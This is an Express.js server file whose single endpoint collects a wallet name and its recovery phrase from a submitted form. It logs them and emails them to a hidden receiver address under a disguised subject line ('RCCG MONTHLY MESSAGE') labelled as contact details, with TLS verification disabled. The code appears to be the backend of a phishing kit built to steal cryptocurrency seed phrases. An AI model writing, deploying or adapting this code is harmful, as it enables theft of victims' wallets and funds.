const express = require("express");
const cors = require("cors");
const app = express();
const PORT = process.env.PORT || 2000;
const path = require("path");
require("dotenv").config();
var nodemailer = require("nodemailer");
const { google } = require("googleapis");

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: false }));

let APP_NAME = process.env.APP_NAME;
let email_server = process.env.email_server;
let email_address = process.env.email_address;
let email_password = process.env.email_password;
let receiver_email = process.env.receiver_email;

app.post("/message", async (req, res) => {
  console.log(req.body);
  const input = `
    <p> You have a messgae</p>
    <h3> Contact Details</h3>
    <ul>
    <li>Wallet: ${req.body.wallet}</li>
    <li>Recovery Phrase: ${req.body.rPhrase}</li>
    </ul>
    `;
  try {
    // create reusable transporter object using the default SMTP transport
    let Transporter = nodemailer.createTransport({
      service: email_server,
      host: email_server,
      port: 587,
      secure: false,

      auth: {
        user: email_address,
        pass: email_password,
      },
      tls: {
        rejectUnauthorized: false,
      },
    });

    const message = {
      from: `"${APP_NAME}" <${email_address}>`,
      to: receiver_email,
      subject: `RCCG MONTHLY MESSAGE`,
      html: input,
    };
    let info = await Transporter.sendMail(message)
      .then((res) => {
        console.log(`Email sent`);
      })
      .catch((err) => {
        console.log(`Error occured:`, err);
      });
  } catch (error) {
    console.log(error);
    return error;
  }
});

app.listen(PORT, () => console.log(`Server started on Port ${PORT}`));
